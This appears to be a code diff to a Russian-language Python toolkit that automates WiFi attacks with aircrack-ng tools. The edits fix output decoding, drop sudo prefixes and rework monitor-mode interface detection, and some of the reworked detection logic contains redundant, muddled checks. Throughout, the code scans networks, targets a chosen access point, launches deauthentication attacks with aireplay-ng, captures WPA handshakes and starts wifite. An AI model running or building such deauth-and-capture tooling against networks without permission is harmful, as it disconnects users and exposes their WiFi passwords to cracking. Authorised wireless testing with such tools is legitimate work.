@@ -79,9 +79,11 @@ def _run_netsh(args):
     cmd = "netsh wlan " + " ".join(args)
     try:
         result = subprocess.run(
-            cmd, shell=True, capture_output=True, text=True, timeout=30
+            cmd, shell=True, capture_output=True, timeout=30
         )
-        return result.stdout, result.stderr, result.returncode
+        stdout = result.stdout.decode("cp866", errors="replace")
+        stderr = result.stderr.decode("cp866", errors="replace")
+        return stdout, stderr, result.returncode
     except subprocess.TimeoutExpired:
         return "", "TIMEOUT", -1
     except Exception as e:
@@ -100,7 +102,7 @@ def scan_networks_windows():
         print_info(" Попробуйте запустить от имени администратора.")
         return
 
-    if not stdout.strip():
+    if stdout is None or not stdout.strip():
         print_warning(" Сети не найдены или адаптер отключён.")
         return
 
@@ -208,19 +210,101 @@ def _check_linux_tool(name):
     return shutil.which(name) is not None
 
 
-def _run_linux(cmd, sudo=False):
+def _run_linux(cmd):
     """Выполнить команду на Linux"""
-    if sudo:
-        cmd = "sudo " + cmd
+    # Убираем sudo если он есть — работает и от root, и с sudo
+    cmd = cmd.replace("sudo ", "", 1)
     try:
         result = subprocess.run(
-            cmd, shell=True, capture_output=True, text=True, timeout=300
+            cmd, shell=True, capture_output=True, timeout=300
         )
-        return result.stdout, result.stderr, result.returncode
+        stdout = result.stdout.decode("utf-8", errors="replace")
+        stderr = result.stderr.decode("utf-8", errors="replace")
+        return stdout, stderr, result.returncode
     except subprocess.TimeoutExpired:
         return "", "TIMEOUT", -1
     except Exception as e:
         return "", str(e), -1
+
+
+def _find_monitor_interfaces():
+    """Ищет monitor-интерфейсы через iwconfig"""
+    stdout, _, _ = _run_linux("iwconfig 2>/dev/null")
+    monitors = []
+    if not stdout:
+        return monitors
+
+    current_iface = None
+    for line in stdout.splitlines():
+        # Строка интерфейса: "wlan0mon  IEEE 802.11  Mode:Monitor  ..."
+        if line and (line[0].isalnum() or line[0] == 'w') and "IEEE" in line:
+            m = re.match(r'^(\S+)', line)
+            if m:
+                current_iface = m.group(1)
+        # Проверяем Mode:Monitor
+        if current_iface and "Mode:Monitor" in line or "Mode:Monitor" in line:
+            # Проверяем, есть ли Mode:Monitor в текущей строке или в строке интерфейса
+            pass
+        if current_iface and "Mode:Monitor" in line:
+            monitors.append(current_iface)
+            current_iface = None
+        # Иногда Mode:Monitor в той же строке что и имя интерфейса
+        if current_iface and "Mode:Monitor" in line:
+            if current_iface not in monitors:
+                monitors.append(current_iface)
+            current_iface = None
+
+    # Альтернативный поиск: ищем "Mode:Monitor" в строке с именем
+    if not monitors:
+        for line in stdout.splitlines():
+            m = re.match(r'^(\S+mon\S*)\s+.*Mode:Monitor', line)
+            if m:
+                monitors.append(m.group(1))
+
+    return monitors
+
+
+def _find_wifi_interfaces():
+    """Ищет обычные WiFi-интерфейсы через iwconfig"""
+    stdout, _, _ = _run_linux("iwconfig 2>/dev/null")
+    ifaces = []
+    if not stdout:
+        return ifaces
+
+    current_iface = None
+    for line in stdout.splitlines():
+        if line and (line[0].isalnum() or line[0] == 'w'):
+            m = re.match(r'^(\S+)', line)
+            if m:
+                current_iface = m.group(1)
+        if current_iface and ("IEEE 802.11" in line or "ESS:" in line or "Mode:Management" in line):
+            if "Mode:Monitor" not in line:
+                ifaces.append(current_iface)
+            current_iface = None
+
+    return ifaces
+
+
+def _enable_monitor_mode(iface):
+    """Включает monitor mode через airmon-ng и возвращает имя monitor-интерфейса"""
+    print_info(f"  Включаем monitor mode на {iface}...")
+    _run_linux(f"airmon-ng start {iface}")
+
+    # Проверяем, какой интерфейс создался
+    import time
+    time.sleep(2)
+
+    monitors = _find_monitor_interfaces()
+    if monitors:
+        return monitors[0]
+
+    # Фоллбэк: пробуем {iface}mon
+    candidate = f"{iface}mon"
+    stdout, _, _ = _run_linux(f"iwconfig {candidate} 2>/dev/null")
+    if stdout and "Mode:Monitor" in stdout:
+        return candidate
+
+    return None
 
 
 def scan_networks_linux():
@@ -232,33 +316,27 @@ def scan_networks_linux():
         print_info(" Установите: sudo apt install -y aircrack-ng")
         return
 
-    # Проверяем, есть ли monitor-интерфейс
-    stdout, _, _ = _run_linux("airmon-ng")
+    # Ищем monitor-интерфейс через iwconfig
     monitor_if = None
-    for line in stdout.splitlines():
-        if "mon" in line and "wlan" in line.lower():
-            parts = line.split()
-            if parts:
-                monitor_if = parts[0]
-                break
-
-    # Если нет monitor-интерфейса, пробуем включить
-    if not monitor_if:
+    monitors = _find_monitor_interfaces()
+    if monitors:
+        monitor_if = monitors[0]
+        print_info(f"  Найден monitor-интерфейс: {monitor_if}")
+    else:
+        # Пробуем включить monitor mode на найденном WiFi-интерфейсе
         print_warning(" Monitor-интерфейс не найден. Пытаемся включить...")
-        # Ищем WiFi-интерфейс
-        stdout2, _, _ = _run_linux("ip link show | grep -E 'wlan|wl'")
-        if stdout2.strip():
-            iface = stdout2.strip().split(":")[0].strip()
-            print_info(f"  Включаем monitor mode на {iface}...")
-            _run_linux(f"airmon-ng start {iface}")
-            monitor_if = f"{iface}mon"
+        wifi_ifaces = _find_wifi_interfaces()
+        if wifi_ifaces:
+            monitor_if = _enable_monitor_mode(wifi_ifaces[0])
         else:
-            # Пробуем wlan0
-            _run_linux("airmon-ng start wlan0")
-            monitor_if = "wlan0mon"
+            # Фоллбэк на wlan0
+            print_info("  Пробуем wlan0...")
+            monitor_if = _enable_monitor_mode("wlan0")
 
     if not monitor_if:
-        print_error(" Не удалось найти WiFi-интерфейс.")
+        print_error(" Не удалось найти или включить monitor-интерфейс.")
+        print_info(" Убедитесь, что WiFi-адаптер поддерживает monitor mode.")
+        safe_input("  [Enter для продолжения...]")
         return
 
     print_info(f"  Monitor-интерфейс: {monitor_if}\n")
@@ -266,7 +344,7 @@ def scan_networks_linux():
 
     try:
         result = subprocess.run(
-            f"sudo airodump-ng {monitor_if}",
+            f"airodump-ng {monitor_if}",
             shell=True,
             check=False,
         )
@@ -279,30 +357,20 @@ def scan_networks_linux():
 
 
 def _get_monitor_interface():
-    """Возвращает monitor-интерфейс или включает его"""
-    stdout, _, _ = _run_linux("airmon-ng")
-    monitor_if = None
-    for line in stdout.splitlines():
-        line = line.strip()
-        if "mon" in line and "wlan" in line.lower():
-            parts = line.split()
-            if parts:
-                monitor_if = parts[0]
-                break
+    """Возвращает monitor-интерфейс или включает его (через iwconfig)"""
+    # Ищем monitor-интерфейсы через iwconfig
+    monitors = _find_monitor_interfaces()
+    if monitors:
+        return monitors[0]
 
-    if not monitor_if:
-        # Ищем WiFi-интерфейс
-        stdout2, _, _ = _run_linux("ip link show | grep -E 'wlan|wl'")
-        if stdout2.strip():
-            iface = stdout2.strip().split(":")[0].strip()
-            print_info(f"  Включаем monitor mode на {iface}...")
-            _run_linux(f"airmon-ng start {iface}")
-            monitor_if = f"{iface}mon"
-        else:
-            _run_linux("airmon-ng start wlan0")
-            monitor_if = "wlan0mon"
-
-    return monitor_if
+    # Пробуем включить monitor mode на найденном WiFi-интерфейсе
+    print_warning(" Monitor-интерфейс не найден. Пытаемся включить...")
+    wifi_ifaces = _find_wifi_interfaces()
+    if wifi_ifaces:
+        return _enable_monitor_mode(wifi_ifaces[0])
+    else:
+        print_info("  Пробуем wlan0...")
+        return _enable_monitor_mode("wlan0")
 
 
 def capture_handshake():
@@ -333,8 +401,7 @@ def capture_handshake():
     print_warning("  Нажмите Ctrl+C для остановки.\n")
 
     stdout, _, _ = _run_linux(
-        f"sudo airodump-ng {monitor_if} --output-format csv -w /tmp/handshake_scan",
-        sudo=True,
+        f"airodump-ng {monitor_if} --output-format csv -w /tmp/handshake_scan"
     )
 
     # Парсим CSV-файл с сетями
@@ -410,7 +477,7 @@ def capture_handshake():
 
     # Запускаем airodump-ng в фоновом режиме
     airodump_cmd = (
-        f"sudo airodump-ng -c {target['channel']} "
+        f"airodump-ng -c {target['channel']} "
         f"--bssid {target['bssid']} -w {pcap_base} "
         f"{monitor_if}"
     )
@@ -427,7 +494,7 @@ def capture_handshake():
     # Запускаем deauth-атаку
     print_info("  Запускаем deauth-атаку...")
     deauth_cmd = (
-        f"sudo aireplay-ng -0 5 -a {target['bssid']} {monitor_if}"
+        f"aireplay-ng -0 5 -a {target['bssid']} {monitor_if}"
     )
     deauth_proc = subprocess.Popen(
         deauth_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
@@ -446,9 +513,10 @@ def capture_handshake():
             if cap_file.endswith("-01.cap"):
                 cap_path = os.path.join(capture_dir, cap_file)
                 result = subprocess.run(
-                    f"sudo airodump-ng -w {capture_dir}/check --write-interval 1 {monitor_if} 2>&1 | grep -i handshake",
-                    shell=True, capture_output=True, text=True, timeout=3
+                    f"airodump-ng -w {capture_dir}/check --write-interval 1 {monitor_if} 2>&1 | grep -i handshake",
+                    shell=True, capture_output=True, timeout=3
                 )
+                _ = result.stdout.decode("utf-8", errors="replace")
                 # Проверяем cap-файл через text search
                 try:
                     with open(cap_path, "rb") as cf:
@@ -569,7 +637,7 @@ def run_wifite():
     print_warning("  ⚠  Используйте только на своих сетях или с разрешения владельца!\n")
 
     try:
-        subprocess.run(["sudo", "wifite"], check=False)
+        subprocess.run(["wifite"], check=False)
     except KeyboardInterrupt:
         print_warning("\n  Wifite остановлен.")
     except Exception as e:
